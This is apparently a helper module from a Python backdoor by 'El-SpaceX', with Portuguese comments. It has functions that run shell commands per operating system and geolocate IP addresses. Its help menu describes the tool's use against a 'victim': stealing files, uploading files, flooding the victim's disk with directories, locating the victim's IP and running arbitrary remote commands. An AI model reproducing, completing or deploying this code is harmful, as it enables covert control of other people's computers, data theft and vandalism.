import platform
from os import system
from urllib.request import urlopen
from json import loads
from socket import *


CONFIGS = {
    'API_IP' : {
        'API'       : 'http://ip-api.com/json/',
        'FIELDS'    : '?fields=66846719',
        'LANG'      : '&lang=pt-BR'
    }
}


def AdaptedFromSystem(Windows='', Linux='', Other=''):
    '''
    verefica o S.O. e executa o comando de acordo com os parametros passados.

    params:
    - Windows    -- Comando que será executado caso o S.O. seja Windows.
    - Linux      -- Comando que será executado caso o S.O. seja Linux.
    - Other      -- Comando que será executado caso o S.O. não nenhum dois.
    '''
    platforma = platform.system()
    if(platforma == 'Windows'): return system(Windows)
    elif(platforma == 'Linux'): return system(Linux)
    else: return system(Other)


def GetIPInfo(query=''):
    '''
    retorna as informações de acordo com a API.

    params:
        - query    -- IP ou dominio para consulta.

    return:
        - Dicionario com as informações recebidas.
    '''
    API = CONFIGS['API_IP']['API']+query+CONFIGS['API_IP']['FIELDS']+CONFIGS['API_IP']['LANG']
    data = urlopen((API)).read().decode()
    return loads(data)


def ShowDialogHelp():
    '''
    Mostra todos comandos especiais e sua descrição.
    '''
    try:
        str = '''
                
        ---------------------------------------------
        |               CREDITS                     |
        --------------------------------------------|
        |   developer: El-SpaceX                    |
        |   github: https://github.com/El-SpaceX    |
        ---------------------------------------------


comandos especiais:

    NXT_checkv      - checa a versao do backdoor.
    NXT_infoip      - exibe informações do ip da vitima(pais, cidade, regiao, host?, proxy?, etc)
    NXT_getfile     - envia um arquivo da maquina da vitima para sua maquina.
    NXT_sendfile    - envia um arquivo da sua maquina para a maquina da vitima.
    NXT_spamdir     - cria uma quantidade determinada de diretorios na maquina da vitima.
    NXT_exit        - fecha conexão com a vitima atual.
    cls - limpa o terminal

comandos normais:

    o comando sera enviado a maquina da vitima que o executara, cuidado com comandos sem resposta.
        '''
        print(str)
    except:
        return False
    return True